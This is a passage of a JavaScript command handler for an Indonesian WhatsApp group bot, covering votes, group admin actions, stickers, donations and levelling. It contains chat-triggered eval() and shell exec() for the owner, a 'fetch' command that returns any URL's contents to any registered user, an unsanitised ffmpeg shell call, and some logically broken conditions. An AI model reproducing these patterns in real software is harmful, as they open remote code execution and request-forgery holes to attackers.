            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return m.reply('Kamu Sudah Vote')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote
*${prefix}upvote* - untuk upvote
*${prefix}devote* - untuk devote`
            conn.sendTextWithMentions(m.chat, teks_vote, m)
	}
            break
                 
case 'cekvote':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
if (!(m.chat in vote)) return m.reply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
conn.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'hapusvote': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
            if (!m.isGroup) return m.reply(mess.group)
if (!(m.chat in vote)) return m.reply(`_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`)
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
case 'report':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return m.reply(`Example: ${prefix + command} error fitur smeme`)
if (text.length > 300) return m.reply(`Teks terlalu panjang`)
nomor = m.sender
ress = `*[REPORT]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${q}`
conn.sendTextWithMentions(`${owner}@s.whatsapp.net`, ress)
m.reply(`Sukses meneruskan report ${text} kepada owner, sihlakan tunggu balasan dari owner!\n\nNote: *Jika report main-main tidak akan di respon owner!*`)
break
case 'join':
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
m.reply(mess.wait)
result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => m.reply('Berhasil bergabung ke group')).catch((err) => m.reply(jsonformat(err)))
break
case 'ephemeral': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (args[0] === '1') {
                    await conn.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => m.reply('Berhasil mengubah ephemeral')).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === '7') {
                    await conn.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => m.reply('Berhasil mengubah ephemeral')).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === '90') {
                    await conn.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => m.reply('Berhasil mengubah ephemeral')).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'off') {
                    await conn.groupToggleEphemeral(m.chat, 0).then((res) => m.reply('Berhasil mematikan ephemeral')).catch((err) => m.reply(jsonformat(err)))
                } else {
                m.reply(`Example: ${prefix + command} 1/7/90/off`)
                }
            }
            break
case 'editinfo': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
             if (args[0] === 'open'){
                await conn.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await conn.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
            m.reply(`Example: ${prefix + command} open/close`)
            }
            }
            break
case 'setppbot': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!isCreator) return m.reply(mess.owner)
                if (!/image/.test(mime)) return m.reply(`Kirim/reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return(`Kirim/reply Image Dengan Caption ${prefix + command}`)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                await conn.updateProfilePicture(nomorBot, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply('Done')
                }
                break
           case 'setppgrup': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
                if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
                if (!/image/.test(mime)) return m.reply(`Kirim/reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return(`Kirim/reply Image Dengan Caption ${prefix + command}`)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                await conn.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply('Done')
                }
                break
case 'setdesc': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
if (!text) return m.reply(`Example: ${prefix + command} Welcome`)
await conn.groupUpdateDescription(m.chat, text).then((res) => m.reply('Berhasil mengganti deskripsi group')).catch((err) => m.reply(jsonformat(err)))
}
break
case 'linkgroup': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins && !m.key.fromMe) return m.reply(mess.botAdmin)
let response = await conn.groupInviteCode(m.chat)
conn.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true ,})
}
break
case 'group': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
if (!text) return m.reply(`Example: ${prefix}group open/close`)
if (args[0].toLowerCase() === 'close') {
await conn.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Berhasil menutup group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0].toLowerCase() === 'open') {
await conn.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Berhasil membuka group`)).catch((err) => m.reply(jsonformat(err)))
}
}
break
case 'tagme':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
var num = m.sender
conn.sendTextWithMentions(m.chat, `@${num.split("@")[0]} Tag!`, m)
break
case 'listadmin':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
teks2 = `List admin group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
teks2 += `@${admon.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks2, mentions: groupAdmins }, { quoted: m })
break
case 'promote': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
		if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(`Berhasil menjadikan admin nomor: ${users}`)).catch((err) => m.reply(jsonformat(err)))
	}
break
	case 'demote': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
		if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(`Berhasil menurunkan admin nomor: ${users}`)).catch((err) => m.reply(jsonformat(err)))
	}
	break
case 'add': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
		if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await conn.groupParticipantsUpdate(m.chat, users, 'add').then((res) => m.reply(`Berhasil menambahkan: ${users}`)).catch((err) => m.reply(jsonformat(err)))
	}
	break
case 'tagall': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
               // if (!isBotAdmins) return m.reply(mess.botAdmin)
            //    if (!isAdmins) return m.reply(mess.admin)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
 }
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'hidetag':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
break
case 'leavegc':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isCreator && !m.key.fromMe) return m.reply(mess.owner)
conn.groupLeave(from)
break
case 'setsubject': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
                if (!isBotAdmins) return m.reply(mess.botAdmin)
                if (!isAdmins) return m.reply(mess.admin)
if (!q) return m.reply(`Example : ${prefix + command} Wibu`)
await conn.groupUpdateSubject(m.chat, text).then((res) => m.reply(`Berhasil mengganti nama group menjadi: ${q}`)).catch((err) => m.reply(jsonformat(err)))
}
break
case 'nano':
if (!isCreator && !m.key.fromMe) return m.reply(mess.owner)
if (!q) return m.reply(`Example : ${prefix + command} index.js`)
anus = fs.readFileSync(`${q}`)
error(util.format(anus), m)
break
case 'eval': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isCreator && !m.key.fromMe) return m.reply(mess.owner)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
error(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
error(util.format(e), m, m.chat)
}
}
break
case 'donasi':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
texx = `「 *DONASI* 」

Hai, Untuk menjaga bot tetap on dan selalu update, sisakan sedikit uang anda untuk mendukung bot:)

*❏* PULSA: 082125039170
*❏* SAWERIA: https://saweria.co/wandaydzxy

「 *SEWA BOT* 」

*_SEWA BOT_* 
*❏* Sewa Bot 10k (1 bulan)
*❏* Sewa Bot 15k (2 bulan)
*❏* Sewa Bot 20k (3 bulan)
*❏* Sewa Bot 50k (6 bulan)


_ARIGATOU_~`
m.reply(texx)
break
case 'delete': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.quoted) return m.reply('false')
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) return m.reply('Pesan tersebut bukan dikirim oleh bot!')
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'fetch':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!q) return m.reply(`Example : #fetch https://youtube.com`)
fetch(`${q}`).then(res => res.text())  
.then(bu =>{
m.reply(bu)
})   
break
case 'owner': {

        
        let vcard = `
BEGIN:VCARD
VERSION:3.0
N:;WandyGunawan;;;
FN:Owner Zero-Bot
item1.TEL;type=CELL;type=VOICE;waid=${owner}:+62 821-2503-9170
item1.X-ABLabel:📱 Ponsel
item2.EMAIL;type=INTERNET:https://wandzxy.my.id
item2.X-ABLabel:🌐 Website
item3.URL:https://instagram.com/wanday_dzxy
item3.X-ABLabel: ✉️ Instagram
item4.ADR:;;Indonesia;;;;
item4.X-ABLabel:🌍 Region
END:VCARD`
	 
    
        return await conn.sendMessage(m.chat, {
            contacts: {
                displayName: nama,
                contacts: [{ vcard }],
                quoted, m
            }
        })
        }
break
case 'toimage':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
try {
m.reply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
let buffer = fs.readFileSync(ran)
conn.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
} catch (e) {
error(util.format(e), m, m.chat)
}
break
case 'ping': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
let timestamp = speed()
let latensi = speed() - timestamp
let all = require('util').inspect(hit.all)
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
m.reply(respon)
}
break
case 'sticker': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
await m.reply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
default:

if (budy.startsWith('>')) {
if (!isCreator) return 
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
m.reply(evaled)
} catch (err) {
m.reply(util.format(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(util.format(err))
                        if (stdout) return m.reply(stdout)
                    })
                }
                
                
                
                
if (budy && m.isGroup && registered, banned) {
try {
ppexpp = await conn.profilePictureUrl(m.sender, 'image')
} catch {
ppexpp = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
let user = global.db.data.users[m.sender]
let before = user.level * 1
	while (levelling.canLevelUp(user.level, user.exp, global.multiplier)) user.level++
	if (before !== user.level) {
duitadd(1000)
limitadd(2)
let asa = `Selamat @${m.sender.split`@`[0]} anda telah naik level!\n*${before}* -> *${user.level}*\n\nAnda mendapatkan +2 limit dan +1000 money\n\ngunakan *.my* untuk mengecek`
sendImageMentionsBuffer(await levelUp(ppexpp), asa, m)
}
}

if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    let room = Object.values(db.data.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
                
if (db.data.chats[m.chat].simi && budy, banned){
try {
resultan = await fetchJson(`https://api.simsimi.net/v2/?text=${encodeURIComponent(budy)}&lc=id`)
await m.reply(resultan.success)
} catch (e) {
error(util.format(e), m, m.chat)
}
}

}
} catch (err) {
console.log(chalk.redBright(util.format(err)))
await error(util.format(err), m, m.chat)
}
};		
  
let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(chalk.redBright(`Sip, File Diupdate (Gak Usah Restart) => ${__filename}`));
delete require.cache[file];
require(file);
});
